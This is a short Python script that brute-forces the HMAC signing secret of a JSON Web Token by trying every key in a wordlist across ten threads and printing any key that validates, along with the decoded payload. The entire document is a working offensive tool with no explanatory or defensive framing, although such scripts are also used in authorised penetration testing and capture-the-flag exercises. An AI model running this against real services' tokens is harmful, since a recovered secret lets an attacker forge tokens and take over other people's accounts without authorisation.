import jwt
from concurrent.futures import ThreadPoolExecutor

def try_decode(token, wordlist_path, algorithm="HS256"):
    with open(wordlist_path, 'r') as f:
        keys = [line.strip() for line in f]

    def check_key(key):
        try:
            decoded = jwt.decode(token, key, algorithms=[algorithm])
            return key, decoded
        except jwt.InvalidTokenError:
            return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(check_key, keys)

    for result in results:
        if result:
            key, payload = result
            print(f"[+] Found key: {key}")
            print(f"[+] Decoded payload: {payload}")
            return

    print("[-] No valid key found.")
